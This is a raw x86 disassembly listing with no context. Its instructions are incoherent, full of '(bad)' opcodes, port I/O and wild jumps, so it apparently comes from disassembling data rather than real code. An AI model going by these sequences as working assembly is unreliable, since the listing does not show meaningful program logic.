  4171f9:	mov    ebx,0x36bf3fa3
  4171fe:	cdq    
  4171ff:	or     edx,edx
  417201:	mov    BYTE PTR [ecx],ch
  417203:	adc    eax,0x42d098a9
  417208:	mov    ecx,0xf3d4755c
  41720d:	in     al,dx
  41720e:	push   edx
  41720f:	dec    edx
  417210:	sub    DWORD PTR [edi+0x164e5212],esi
  417216:	out    0xc6,eax
  417218:	mov    gs,WORD PTR [ecx+0x466cef3b]
  41721e:	dec    esi
  41721f:	in     al,dx
  417220:	sbb    al,0xae
  417222:	and    BYTE PTR [edi+0x57363569],ch
  417228:	lods   al,BYTE PTR ds:[esi]
  417229:	(bad)  
  41722a:	lods   eax,DWORD PTR ds:[esi]
  41722b:	dec    esi
  41722c:	jmp    0x2d051a06
  417231:	jb     0x41728d
  417233:	mov    edi,0x3489c4e3
  417238:	mov    edx,0x78cca6c3
  41723d:	inc    bl
  41723f:	mov    bh,0x69
  417241:	(bad)  
  417243:	lods   al,BYTE PTR ds:[esi]
  417244:	pop    edi
  417245:	dec    eax
  417246:	jno    0x41721e
  417248:	cmp    al,0xd8
  41724a:	fbstp  TBYTE PTR [ecx]
  41724c:	repz dec ebp
  41724e:	loope  0x417242
  417250:	dec    eax
  417251:	fist   WORD PTR [eax]
  417253:	pushf  
  417254:	mov    dh,0x63
  417256:	or     ecx,DWORD PTR [edi]
  417258:	pop    es
  417259:	xchg   ebx,eax
  41725a:	adc    DWORD PTR [edx-0x6a2a1810],esi
  417260:	ret    0x89cc
  417263:	adc    DWORD PTR [ecx],0x6e81f68e
  417269:	push   0x42
  41726b:	in     eax,0x24
  41726d:	pop    ds
  41726e:	inc    ebx
  41726f:	retf   0x46dc
  417272:	out    0xe6,al
  417274:	sub    al,0xcf
  417276:	mov    esp,DWORD PTR [esi-0x6c3d0bdd]
  41727c:	dec    eax
  41727d:	xchg   esp,eax
  41727e:	pop    edi
  41727f:	daa    
  417280:	stos   BYTE PTR es:[edi],al
  417281:	jecxz  0x417290
  417283:	ret    
  417284:	out    0xe8,eax
  417286:	ins    BYTE PTR es:[edi],dx
  417287:	adc    al,0x8a
  417289:	sbb    edx,edi
  41728b:	dec    eax
  41728c:	mov    ah,0x39
  41728e:	addr16 test ch,bh
  417291:	jmp    0x41725f
  417293:	mov    eax,0x1d7aacf1
  417298:	inc    si
  41729a:	test   eax,0x70de03a4
  41729f:	sti    
  4172a0:	sbb    BYTE PTR [edx+edx*4+0x1f896835],ch
  4172a7:	xchg   edi,eax
  4172a8:	int    0x6a
  4172aa:	sub    DWORD PTR [ecx+0xa],esi
  4172ad:	jmp    0x4172af
  4172af:	and    eax,0xf443d669
  4172b4:	sub    edi,eax
  4172b6:	bound  esi,QWORD PTR [ebp+0x40ada9d0]
  4172bc:	in     al,dx
  4172bd:	mov    al,0x7e
  4172bf:	sub    edx,DWORD PTR [eax+edx*1+0xd]
  4172c3:	(bad)  
  4172c4:	sbb    cl,al
  4172c6:	aad    0x63
  4172c8:	aam    0x13
  4172ca:	xchg   DWORD PTR [ebx],ecx
  4172cc:	adc    cl,BYTE PTR [edx+edx*8-0x7a]
  4172d0:	arpl   WORD PTR [ebx-0x5a],bx
  4172d3:	dec    ebp
  4172d4:	push   esp
  4172d5:	add    DWORD PTR [eax+eiz*8+0x13],edi
  4172d9:	add    DWORD PTR [esi],esp
  4172db:	(bad)  
  4172dc:	xlat   BYTE PTR ds:[ebx]
  4172dd:	mov    dl,0xd
  4172df:	dec    ebx
  4172e0:	std    
  4172e1:	push   eax
  4172e2:	(bad)  
  4172e3:	xor    bl,ch
  4172e5:	push   ecx
  4172e6:	adc    BYTE PTR [edi+0x19],0x72
  4172ea:	pop    ds
  4172eb:	and    BYTE PTR [ebx+eiz*1],0x7d
  4172ef:	sub    DWORD PTR [ebp+0x502f8856],eax
  4172f5:	ja     0x417320
  4172f7:	add    eax,0xe2b16077
  4172fc:	pusha  
  4172fd:	pop    ebp
  4172fe:	outs   dx,DWORD PTR es:[esi]
  417300:	push   ss
  417301:	adc    DWORD PTR [esi],ecx
  417303:	(bad)  
  417305:	nop
  417306:	push   ds
  417307:	hlt    
  417308:	inc    edi
  417309:	outs   dx,BYTE PTR ds:[esi]
  41730a:	lods   al,BYTE PTR ds:[esi]
  41730b:	dec    eax
  41730c:	idiv   BYTE PTR [ebx-0x15]
  41730f:	call   FWORD PTR [eax-0x4]
  417312:	mul    DWORD PTR [ebx+0xf911524]
  417318:	mov    db3,esp
  41731b:	out    0x57,al
  41731d:	and    al,BYTE PTR [ebx+eax*8+0x7244d0]
  417324:	dec    ebp
  417325:	fucomi st,st(1)
  417327:	test   DWORD PTR [esi+0x7f5788ec],0xe1ca4b6
  417331:	jbe    0x41737f
  417333:	sub    BYTE PTR [eax],cl
  417335:	jmp    DWORD PTR [esi+0xe]
  417338:	or     eax,0x17ae05ae
  41733d:	push   eax
  41733e:	cli    
  41733f:	in     eax,0xcc
  417341:	inc    ecx
  417342:	int3   
  417343:	in     al,dx
  417344:	stc    
  417345:	test   DWORD PTR [ecx+0x2b055f22],edi
  41734b:	cmp    cl,ch
  41734d:	or     ebx,DWORD PTR ds:0x3f0b780e
  417353:	out    0x71,al
  417355:	jb     0x41731f
  417357:	rol    BYTE PTR [edx+ebx*4-0x6ee16a4e],cl
  41735e:	ret    0xdd34
  417361:	mov    dh,0x35
  417363:	pusha  
  417364:	popf   
  417365:	fwait
  417366:	mov    ah,BYTE PTR [edi]
  417368:	in     eax,dx
  417369:	jne    0x4173ae
  41736b:	std    
  41736c:	pop    edi
  41736d:	adc    edi,DWORD PTR ds:0x66defe83
  417373:	xchg   esp,eax
  417374:	cmc    
  417375:	mov    ds:0xda376378,al
  41737a:	or     al,0xd6
  41737c:	cmp    eax,0x29c51e5c
  417381:	adc    edi,esp
  417383:	sub    edi,eax
  417385:	in     al,0xf4
  417387:	in     eax,0x78
  417389:	inc    ecx
  41738a:	call   0xcaa998e
  41738f:	ret    
  417390:	mov    dh,0xc2
  417392:	pop    ss
  417393:	in     al,dx
  417394:	add    eax,0x735e6312
  417399:	test   eax,ebp
  41739b:	xchg   ebx,eax
  41739c:	dec    edx
  41739d:	test   bh,ah
  41739f:	cwde   
  4173a0:	mov    ds,WORD PTR [ebx-0x6aed00c6]
  4173a6:	cs push ecx
  4173a8:	std    
  4173a9:	in     al,0x20
  4173ab:	rol    DWORD PTR [esi],1
  4173ad:	fcomp  QWORD PTR [ebp+0x4cda3265]
  4173b3:	fdiv   QWORD PTR [edi-0x15d9d863]
  4173b9:	inc    esi
  4173ba:	inc    esi
  4173bb:	mov    esp,0xaf00c6b0
  4173c0:	jg     0x4173e8
  4173c2:	jb     0x417442
  4173c4:	fstp   TBYTE PTR [ebx-0x5a2b112c]
  4173ca:	stos   DWORD PTR es:[edi],eax
  4173cb:	dec    esi
  4173cc:	push   esp
  4173cd:	jp     0x4173fe
  4173cf:	dec    edx
  4173d0:	imul   ebx,edi,0x20
  4173d3:	fcmovu st,st(3)
  4173d5:	sub    cl,bh
  4173d7:	mov    ds:0x8d2a130e,eax
  4173dc:	push   ss
  4173dd:	xchg   ebx,eax
  4173de:	iret   
  4173df:	jle    0x4173b8
  4173e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e2:	fild   DWORD PTR [ebx+0x3b]
  4173e5:	and    ebx,DWORD PTR [ebp-0x340775bb]
  4173eb:	es jne 0x41743f
  4173ee:	pop    ecx
  4173ef:	sbb    dl,BYTE PTR [eax+0x3]
  4173f2:	int3   
  4173f3:	in     eax,0xdc
  4173f5:	out    dx,al
  4173f6:	pop    es
  4173f7:	mov    DWORD PTR [esi],ebx
  4173f9:	mov    eax,ds:0x5e6d2215
  4173fe:	mov    eax,0xeaed33cd
  417403:	and    dl,ah
  417405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417406:	mov    cl,BYTE PTR [eax]
  417408:	cs sbb al,0xdc
  41740b:	out    dx,al
  41740c:	dec    ebx
  41740d:	std    
  41740e:	outs   dx,BYTE PTR ds:[esi]
  41740f:	inc    esp
  417410:	mov    cs,WORD PTR [ebx+0x0]
  417413:	jle    0x417403
  417415:	int    0x5a
  417417:	xchg   esi,eax
  417418:	add    eax,0x39730fe5
  41741d:	cdq    
  41741e:	or     BYTE PTR [edi],ah
  417420:	jmp    0x7f195909
  417425:	jp     0x417402
  417427:	call   0x2f1f6970
  41742c:	xchg   ecx,eax
  41742d:	fwait
  41742e:	call   0x5fe148c5
  417433:	ret    
  417434:	and    BYTE PTR [eax+0x7b1417a2],cl
  41743a:	rcl    ah,cl
  41743c:	int    0xe9
  41743e:	xchg   esi,eax
  41743f:	test   al,0xfc
  417441:	cld    
  417442:	xor    ebx,DWORD PTR [ecx+0x2d22b516]
  417448:	adc    ebp,DWORD PTR [edi+0x42]
  41744b:	es out 0xf6,eax
  41744e:	mov    ch,0xd6
  417450:	lahf   
  417451:	sar    DWORD PTR [edx+0x2f],cl
  417454:	into   
  417455:	fnstcw WORD PTR ds:0x9d25fdef
  41745b:	jmp    0xce2b6844
  417460:	cwde   
  417461:	iret   
  417462:	imul   ebx,DWORD PTR [ecx-0x5c],0xffffffa4
  417466:	lfs    esp,FWORD PTR [edx]
  417469:	pushf  
  41746a:	push   edi
  41746b:	es mov eax,0xca506cd6
  417471:	scas   eax,DWORD PTR es:[edi]
  417472:	or     eax,0x1adc6cd5
  417477:	sti    
  417478:	popa   
  417479:	clc    
  41747a:	mov    ecx,esp
  41747c:	ret    
  41747d:	inc    ebp
  41747e:	mov    ah,0xaa
  417480:	popa   
  417481:	inc    esp
  417482:	adc    DWORD PTR ds:0x5734356c,ebx
  417488:	push   esp
  417489:	add    esi,ebp
  41748b:	fidiv  WORD PTR [esi+edi*4]
  41748e:	pop    ss
  41748f:	imul   edx,DWORD PTR [ebx],0xd6ba25b1
  417495:	nop
  417496:	add    al,0xc2
  417498:	out    0x2d,al
  41749a:	ror    DWORD PTR [eax+0x3f],1
  41749d:	cli    
  41749e:	js     0x4174f6
  4174a0:	cmp    BYTE PTR [edi-0x2e313445],ch
  4174a6:	mov    edx,0xc8635f82
  4174ab:	repz fdiv QWORD PTR [edi-0x49]
  4174af:	out    dx,eax
  4174b0:	sub    DWORD PTR [edi+0x3e12babc],0x7e
  4174b7:	fstp   TBYTE PTR [ecx-0x1fe7a173]
  4174bd:	mov    ebp,0x237b43e5
  4174c2:	xchg   BYTE PTR [eax],ah
  4174c4:	sub    al,0xa8
  4174c6:	mov    dh,0xda
  4174c8:	arpl   WORD PTR [ebp-0x77],bx
  4174cb:	out    dx,eax
  4174cc:	xchg   esp,eax
  4174cd:	mov    eax,ds:0x95783b73
  4174d2:	mov    ch,0xaf
  4174d4:	xchg   ebx,eax
  4174d5:	jl     0x41746e
  4174d7:	and    BYTE PTR [eax+0x65],cl
  4174da:	cli    
  4174db:	xchg   edi,eax
  4174dc:	test   BYTE PTR [ebx+0x29],ch
  4174df:	test   DWORD PTR [ebx+esi*4],edx
  4174e2:	fbld   TBYTE PTR [ebp+0x3fd54dc2]
  4174e8:	sbb    bh,dh
  4174ea:	xchg   edi,eax
  4174eb:	inc    eax
  4174ec:	arpl   WORD PTR [edx],cx
  4174ee:	(bad)  
  4174ef:	test   eax,0xdbe34ec3
  4174f4:	add    DWORD PTR [eiz*2-0x5909bcec],esi
  4174fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174fc:	mov    al,ds:0x3dec23ce
  417501:	adc    eax,0x932e5515
  417506:	cs jns 0x417563
  417509:	cmc    
  41750a:	xor    ah,BYTE PTR [ecx+0x3b]
  41750d:	jne    0x417580
  41750f:	int    0x30
  417511:	xor    ah,bl
  417513:	cmp    BYTE PTR [ecx-0x71],bh
  417516:	cmp    DWORD PTR [edx+0x2f],0xffffffef
  41751a:	pushf  
  41751b:	jb     0x4174f2
  41751d:	and    BYTE PTR [esi+ebp*1-0x35353416],cl
  417524:	add    al,0x8
  417526:	sahf   
  417527:	mov    bh,0x22
  417529:	aad    0xe8
  41752b:	mov    al,ds:0x41c692ac
  417530:	je     0x417552
  417532:	test   BYTE PTR [esi],ch
  417534:	dec    esi
  417535:	iret   
  417536:	in     eax,0xc7
  417538:	stc    
  417539:	mov    ds:0xd95814e0,al
  41753e:	add    ch,al
  417540:	mov    ebx,0xd5f537a4
  417545:	ror    BYTE PTR [edx+0x29],cl
  417548:	(bad)  [ebx+0x1f]
  41754b:	adc    al,bl
  41754d:	out    0x80,eax
  41754f:	xor    DWORD PTR [edi-0x6],esi
  417552:	dec    eax
  417553:	mov    ch,0x8
  417555:	pop    eax
  417556:	fsub   QWORD PTR [eax+0x6687ddcc]
  41755c:	nop
  41755d:	inc    edx
  41755e:	fadd   DWORD PTR [ecx-0x4cbe00a8]
  417564:	sub    al,ah
  417566:	sbb    DWORD PTR [edx-0x5f8c5a94],edx
  41756c:	sar    BYTE PTR [edx+esi*8+0x17b532c4],1
  417573:	mov    ch,0x4e
  417575:	inc    eax
  417576:	push   es
  417577:	out    dx,eax
  417578:	imul   ebx,DWORD PTR [edi],0x4c89b3dd
  41757e:	jno    0x4175d3
  417580:	es jmp 0xd37e6b2
  417586:	cdq    
  417587:	or     esp,esp
  417589:	sbb    bh,BYTE PTR [eax-0x561dcac0]
  41758f:	push   es
  417590:	btc    DWORD PTR [edi+0x5e],eax
  417594:	ret    0xf6c1
  417597:	mov    cl,0xf5
  417599:	fdivr  DWORD PTR [ecx-0x31c9c934]
  41759f:	out    dx,al
  4175a0:	and    eax,0xf42d965d
  4175a5:	pop    ds
  4175a6:	sub    ecx,DWORD PTR [ebx+ecx*2+0x1e]
  4175aa:	jle    0x41754e
  4175ac:	leave  
  4175ad:	mov    dh,0xd3
  4175af:	imul   edx,DWORD PTR [edx],0x43
  4175b2:	xlat   BYTE PTR ds:[ebx]
  4175b3:	cmp    al,cl
  4175b5:	sub    eax,0x7e30210d
  4175ba:	pop    es
  4175bb:	ret    0xc796
  4175be:	xchg   DWORD PTR [esi+0x38efbf52],edi
  4175c4:	retf   
  4175c5:	imul   ebx,DWORD PTR [esi+0x119dfa4e],0xffffffd6
  4175cc:	neg    BYTE PTR [ebp-0x7a]
  4175cf:	aam    0xc6
  4175d1:	call   0x6f125891
  4175d6:	lds    ebx,FWORD PTR [ecx]
  4175d8:	ja     0x4175ab
  4175da:	std    
  4175db:	loopne 0x4175ee
  4175dd:	jae    0x41757e
  4175df:	cmp    ebp,DWORD PTR [edi-0x6f]
  4175e2:	lods   al,BYTE PTR ds:[esi]
  4175e3:	fcomip st,st(1)
  4175e5:	push   eax
  4175e6:	(bad)  
  4175e7:	outs   dx,DWORD PTR ds:[esi]
  4175e8:	js     0x4175e2
  4175ea:	shr    BYTE PTR [ecx+0x7b09725b],cl
  4175f0:	std    
  4175f1:	ins    DWORD PTR es:[edi],dx
  4175f2:	pop    ebp
  4175f3:	sar    esp,0x23
  4175f6:	xchg   edi,eax
  4175f7:	cmp    edx,DWORD PTR [edi-0x62]
  4175fa:	aaa    
  4175fb:	loope  0x417609
  4175fd:	adc    BYTE PTR [edi+ecx*2-0x4f],0x1
  417602:	mov    esp,cs
  417604:	pop    ecx
  417605:	mov    ah,0xfe
  417607:	clc    
  417608:	enter  0x4d57,0x39
  41760c:	or     ecx,DWORD PTR [esi+ebx*4-0x47dfb8cc]
  417613:	fwait
  417614:	or     eax,0x5592a640
  417619:	jo     0x417624
  41761b:	push   0xffffffc2
  41761d:	fmul   DWORD PTR [esp+edi*1+0x42]
  417621:	je     0x417626
  417623:	cwde   
  417624:	mov    DWORD PTR [ebx+esi*1+0x308ce5f4],edi
  41762b:	jmp    0x9f162037
  417630:	cmp    edi,DWORD PTR [esi]
  417632:	or     DWORD PTR [esi+edx*8],ecx
  417635:	popa   
  417636:	xchg   ecx,eax
  417637:	xchg   esp,eax
  417638:	push   es
  417639:	in     eax,0x74
  41763b:	fs stos DWORD PTR es:[edi],eax
  41763d:	paddw  mm6,QWORD PTR [edx-0x45]
  417641:	in     eax,dx
  417642:	cwde   
  417643:	leave  
  417644:	(bad)  
  417645:	xor    BYTE PTR [ebx+0xd],cl
  417648:	pop    ebx
  417649:	pop    eax
  41764a:	cli    
  41764b:	fcmovnu st,st(3)
  41764d:	sbb    BYTE PTR [edi-0x67],dl
  417650:	dec    eax
  417651:	jb     0x417614
  417653:	sbb    al,0x16
  417655:	fstp   TBYTE PTR [ecx+0x74]
  417658:	fcomp  st(7)
  41765a:	dec    ecx
  41765b:	and    eax,0x1d3b62e2
  417660:	nop
  417661:	popa   
  417662:	or     BYTE PTR [edx+0x41],dh
  417665:	pop    esi
  417666:	inc    edx
  417667:	out    0xde,al
  417669:	pop    eax
  41766a:	jle    0x4176d9
  41766c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41766d:	bound  ebx,QWORD PTR [ecx+0x71]
  417670:	fsubp  st(3),st
  417672:	enter  0x266,0xa0
  417676:	jmp    0xec63:0x9bc0a25f
  41767d:	push   DWORD PTR [ebx-0x2b0cd8aa]
  417683:	xlat   BYTE PTR ds:[ebx]
  417684:	loopne 0x4176f5
  417686:	sbb    ecx,esp
  417688:	inc    ebp
  417689:	inc    esp
  41768a:	data16 hlt 
  41768c:	pop    ds
  41768d:	bound  ebx,QWORD PTR [edi-0x15069d70]
  417693:	mov    ebx,0x4405b60f
  417698:	cmp    dh,dl
  41769a:	xchg   esp,eax
  41769b:	inc    esp
  41769c:	pop    esi
  41769d:	jg     0x41768f
  41769f:	sbb    ebp,DWORD PTR [edi+0x1f]
  4176a2:	clc    
  4176a3:	scas   al,BYTE PTR es:[edi]
  4176a4:	cmp    esi,esi
  4176a6:	push   0xa7c33567
  4176ab:	adc    BYTE PTR [edx-0x18bec94e],al
  4176b1:	dec    ecx
  4176b2:	scas   eax,DWORD PTR es:[edi]
  4176b3:	ja     0x417643
  4176b5:	iret   
  4176b6:	xor    eax,0xa77f4e32
  4176bb:	(bad)  
  4176bd:	fisub  DWORD PTR [edx-0x34]
  4176c0:	out    0xf0,al
  4176c2:	jnp    0x417663
  4176c4:	cdq    
  4176c5:	mov    fs,WORD PTR [eax+0x4b]
  4176c8:	loopne 0x417670
  4176ca:	xchg   edx,eax
  4176cb:	test   eax,0xddefe46
  4176d0:	hlt    
  4176d1:	xchg   DWORD PTR [edx],ebx
  4176d3:	dec    ebp
  4176d4:	add    edi,DWORD PTR [ebp-0x1f]
  4176d7:	(bad)  
  4176d8:	lock mov cl,BYTE PTR [edx+ebx*1-0x1c]
  4176dd:	mov    cl,0x7
  4176df:	jbe    0x41775d
  4176e1:	dec    esp
  4176e2:	(bad)  
  4176e3:	or     BYTE PTR [ebp+0x23],bl
  4176e6:	jge    0x417731
  4176e8:	nop
  4176e9:	cdq    
  4176ea:	dec    ebx
  4176eb:	add    DWORD PTR [esi+0x2d],ecx
  4176ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176ef:	add    BYTE PTR [esi-0x7855ac4b],bl
  4176f5:	add    al,0xe8
  4176f7:	xchg   esp,eax
  4176f8:	scas   eax,DWORD PTR es:[edi]
  4176f9:	loope  0x4176f3
  4176fb:	inc    esp
  4176fc:	popa   
  4176fd:	cmp    al,0xf8
  4176ff:	fdiv   QWORD PTR [ecx-0x56]
  417702:	sbb    eax,0x8038ffd0
  417707:	dec    edx
  417708:	push   edx
  417709:	lods   al,BYTE PTR ds:[esi]
  41770a:	pop    ss
  41770b:	dec    esp
  41770c:	and    eax,0x37ebdbcd
  417711:	xchg   ebx,eax
  417712:	cmc    
  417713:	and    DWORD PTR [edi],0xa7e7768f
  417719:	mov    DWORD PTR [eax+ebp*8+0x1c],edx
  41771d:	sbb    eax,0x330268da
  417722:	add    eax,0xa665ef1e
  417727:	xchg   esp,eax
  417728:	ret    
  417729:	aam    0xe5
  41772b:	add    BYTE PTR [esi],0x9b
  41772e:	and    al,BYTE PTR [ecx-0x1d30ded9]
  417734:	mov    edx,0xd4eeeaf3
  417739:	inc    eax
  41773a:	jae    0x4177b2
  41773c:	popf   
  41773d:	and    DWORD PTR [edi+0x6d82932c],ecx
  417743:	sbb    al,0x18
  417745:	fnstenv [ebx]
  417747:	lods   al,BYTE PTR ds:[esi]
  417748:	cmp    ah,BYTE PTR [edi]
  41774a:	cmovge esi,DWORD PTR [esi+0x72]
  41774e:	mov    ebx,0x65345738
  417753:	push   ss
  417754:	xor    al,0xc2
  417756:	mov    eax,ds:0x4efa8b95
  41775b:	push   0x6f
  41775d:	dec    ecx
  41775e:	xchg   DWORD PTR [edi-0x57],edi
  417761:	dec    eax
  417762:	sar    BYTE PTR [ecx+0x7b65f7e1],0x9b
  417769:	jno    0x417739
  41776b:	sub    DWORD PTR [edi+0x512a61bc],edx
  417771:	xchg   esp,eax
  417772:	push   cs
  417773:	ficom  WORD PTR [ebx]
  417775:	scas   al,BYTE PTR es:[edi]
  417776:	imul   esi,DWORD PTR [esi],0x8a3b170c
  41777c:	retf   0x765d
  41777f:	lock and bh,BYTE PTR ds:0x547ee91a
  417786:	lods   al,BYTE PTR ds:[esi]
  417787:	in     al,dx
  417788:	push   ds
  417789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41778a:	cmp    eax,0x3439c1c8
  41778f:	and    al,0x9c
  417791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417793:	out    0xa4,al
  417795:	lock sub DWORD PTR [edx],ebp
  417798:	mov    al,0x75
  41779a:	(bad)  [ecx]
  41779c:	stos   DWORD PTR es:[edi],eax
  41779d:	adc    al,0x50
  41779f:	pop    ebx
  4177a0:	cwde   
  4177a1:	loop   0x4177e1
  4177a3:	jmp    0xd4bd08b4
  4177a8:	push   ebp
  4177a9:	(bad)  
  4177aa:	sub    esi,ebx
  4177ac:	(bad)  ds:0xc03bf479
  4177b2:	sbb    edi,DWORD PTR fs:[esi-0x5e93f135]
  4177b9:	ja     0x417782
  4177bb:	and    ch,BYTE PTR [esi-0x21]
  4177be:	or     eax,0x6e0d2f08
  4177c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177c4:	jmp    0x7c017e88
  4177c9:	cmp    al,0xa0
  4177cb:	push   ss
  4177cc:	in     al,dx
  4177cd:	jo     0x4177b7
  4177cf:	sub    DWORD PTR [edx+0x4b],esp
  4177d2:	dec    ecx
  4177d3:	cmp    eax,DWORD PTR [ebx]
  4177d5:	loop   0x417827
  4177d7:	inc    esp
  4177d8:	pop    esp
  4177d9:	fs stos BYTE PTR es:[edi],al
  4177db:	add    eax,0x979db40d
  4177e0:	sbb    al,0x6b
  4177e2:	clc    
  4177e3:	cmp    al,BYTE PTR [ebx]
  4177e5:	push   edi
  4177e6:	pushf  
  4177e7:	xchg   ecx,eax
  4177e8:	push   esp
  4177e9:	xor    al,0x44
  4177eb:	sub    al,0x56
  4177ed:	mov    ds:0xcea0e63e,eax
  4177f2:	repnz lahf 
  4177f4:	lock das 
  4177f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177f7:	call   0xa9bc461d
  4177fc:	test   BYTE PTR [edx-0x25],al
  4177ff:	adc    bl,0xd7
  417802:	xchg   esp,eax
  417803:	(bad)  
  417804:	lea    edx,[ebx]
  417806:	stos   BYTE PTR es:[edi],al
  417807:	inc    edx
  417808:	pop    ebx
  417809:	test   DWORD PTR [ebx+ebx*8-0x3d],ecx
  41780d:	adc    al,0xd4
  41780f:	mov    edi,0x3ddc423c
  417814:	xlat   BYTE PTR ds:[ebx]
  417815:	addr16 add dh,al
  417818:	push   ds
  417819:	outs   dx,DWORD PTR ds:[esi]
  41781a:	fcom   DWORD PTR [eax+0x3e]
  41781d:	xchg   DWORD PTR [esi+0xd],esp
  417820:	ficom  WORD PTR [eax]
  417822:	pop    eax
  417823:	jecxz  0x417855
  417825:	sbb    BYTE PTR [edx],ah
  417827:	mov    ds:0x94f489,al
  41782c:	cld    
  41782d:	retf   0xb93b
  417830:	jp     0x4177c1
  417832:	loop   0x4178aa
  417834:	call   0x26b7c1fd
  417839:	(bad)  
  41783a:	mov    ebp,0x1a0ec510
  41783f:	test   al,0x47
  417841:	es push edx
  417843:	stc    
  417844:	sub    BYTE PTR [eax+0x72],bl
  417847:	repnz out dx,eax
  417849:	and    dh,al
  41784b:	sub    eax,0x9fe0b1a9
  417850:	out    dx,eax
  417851:	les    ecx,FWORD PTR [ebx+0x11]
  417854:	ins    DWORD PTR es:[edi],dx
  417855:	(bad)  
  417856:	cli    
  417857:	jle    0x4178c9
  417859:	nop
  41785a:	sbb    DWORD PTR [esi+0x3d],ebp
  41785d:	pusha  
  41785e:	fiadd  DWORD PTR [eax+0x7c]
  417861:	into   
  417862:	sub    DWORD PTR [ebp+0x1a],ebx
  417865:	cli    
  417866:	push   eax
  417867:	mov    ds:0x3c3b1389,eax
  41786c:	sbb    DWORD PTR [ebx+ebp*4],eax
  41786f:	adc    bh,dh
  417871:	ror    DWORD PTR [esi+0x60fe03b0],1
  417877:	aam    0x4b
  417879:	mov    eax,ds:0x9891ebc2
  41787e:	cwde   
  41787f:	dec    esi
  417880:	cwde   
  417881:	cmp    BYTE PTR [eax],ch
  417883:	popf   
  417884:	test   BYTE PTR [esi-0x1f],dl
  417887:	push   0xe6831e32
  41788c:	pusha  
  41788d:	xchg   BYTE PTR [esi+0xf260fb9],cl
  417893:	shl    BYTE PTR [ebx],cl
  417895:	fidivr DWORD PTR [eax+eiz*4-0x4ed58f27]
  41789c:	sub    eax,DWORD PTR [ecx-0x2d7e1d7c]
  4178a2:	xor    DWORD PTR es:[ecx-0xa5e3b2e],0x4
  4178aa:	lahf   
  4178ab:	and    DWORD PTR [ecx],esp
  4178ad:	pop    ebx
  4178ae:	push   0xb1ae4a67
  4178b3:	push   es
  4178b4:	or     eax,0x850c902
  4178b9:	adc    ah,BYTE PTR [eax]
  4178bb:	dec    edx
  4178bc:	adc    edi,DWORD PTR [edx-0x40]
  4178bf:	mov    ebx,0x870a4920
  4178c4:	pop    esp
  4178c5:	sub    DWORD PTR [eax-0x76d2303],edi
  4178cb:	mov    ecx,ebp
  4178cd:	fnstenv [esi-0x6821c44f]
  4178d3:	xchg   ebp,eax
  4178d4:	mov    eax,ds:0xa5bdea4a
  4178d9:	dec    DWORD PTR [esi]
  4178db:	arpl   WORD PTR [ebx+0x6b1c836c],bp
  4178e1:	jne    0x4178a9
  4178e3:	lods   eax,DWORD PTR gs:[esi]
  4178e5:	mov    edx,0x5d55861
  4178ea:	push   cs
  4178eb:	ins    BYTE PTR es:[edi],dx
  4178ec:	and    al,0x55
  4178ee:	jmp    0x3233022e
  4178f3:	in     eax,dx
  4178f4:	rcr    eax,0xcd
  4178f7:	cmp    DWORD PTR [ebx+edx*4-0x2e98e1b0],esi
  4178fe:	sahf   
  4178ff:	imul   ebp,DWORD PTR ds:[esi-0x74],0x56e27009
  417907:	cmp    al,0x83
  417909:	jle    0x4178a3
  41790b:	icebp  
  41790c:	and    DWORD PTR [ebp-0x59f03533],esi
  417912:	sbb    DWORD PTR [di+0x403d],edx
  417917:	aam    0x44
  417919:	jae    0x4178c3
  41791b:	imul   BYTE PTR [eax-0x3a99b7ca]
  417921:	imul   ch
  417923:	add    ah,bl
  417925:	jbe    0x4178fe
  417927:	xchg   edx,eax
  417928:	inc    edx
  417929:	ins    BYTE PTR es:[edi],dx
  41792a:	jo     0x4178ee
  41792c:	stc    
  41792d:	add    al,0x2e
  41792f:	xlat   BYTE PTR ds:[ebx]
  417930:	mov    WORD PTR [ebp-0x6b],?
  417933:	jmp    0x417922
  417935:	xchg   ebp,ecx
  417937:	retf   0xcde8
  41793a:	jb     0x41795b
  41793c:	adc    bh,BYTE PTR [ecx+0x79554196]
  417942:	outs   dx,DWORD PTR ds:[esi]
  417943:	jmp    0x2afa:0x6430fbef
  41794a:	pop    eax
  41794b:	jecxz  0x417985
  41794d:	mov    esi,0x8c6567d5
  417952:	jnp    0x4179a9
  417954:	and    dl,BYTE PTR [esi-0x37]
  417957:	data16 jle 0x41792b
  41795a:	repz pop ebx
  41795c:	mov    ch,0x68
  41795e:	mov    ebp,0xc3bce743
  417963:	fs jg  0x4179b4
  417966:	push   ss
  417967:	fs shl ebp,cl
  41796a:	fsub   QWORD PTR [ebp+0x6a113fb9]
  417970:	sahf   
  417971:	mov    ah,0x49
  417973:	rcl    BYTE PTR [ebx+0x20],1
  417976:	inc    ebx
  417977:	adc    esi,DWORD PTR [eax+edi*8-0x41653939]
  41797e:	adc    esi,DWORD PTR [ebx]
  417980:	push   ebx
  417981:	ret    
  417982:	xor    eax,0x53529bb2
  417987:	mov    esp,0x57867812
  41798c:	mov    edi,0xcaef2288
  417991:	pop    esi
  417992:	out    0x2,eax
  417994:	and    ah,ch
  417996:	jno    0x417936
  417998:	in     eax,dx
  417999:	ss jo  0x4179a4
  41799c:	dec    ecx
  41799d:	call   0x85766ee4
  4179a2:	pushfw 
  4179a4:	in     al,0x86
  4179a6:	mul    ebx
  4179a8:	gs inc ecx
  4179aa:	pop    eax
  4179ab:	test   DWORD PTR [ecx+0x32],ebx
  4179ae:	jns    0x4179b0
  4179b0:	sahf   
  4179b1:	lods   al,BYTE PTR ds:[esi]
  4179b2:	push   ebp
  4179b3:	cmc    
  4179b4:	sub    edx,DWORD PTR [edx]
  4179b6:	and    ah,cl
  4179b8:	aam    0xc7
  4179ba:	pusha  
  4179bb:	aam    0xe9
  4179bd:	aad    0xba
  4179bf:	bswap  edi
  4179c1:	lahf   
  4179c2:	div    DWORD PTR [ebx]
  4179c4:	das    
  4179c5:	xlat   BYTE PTR ds:[ebx]
  4179c6:	in     eax,dx
  4179c7:	pop    eax
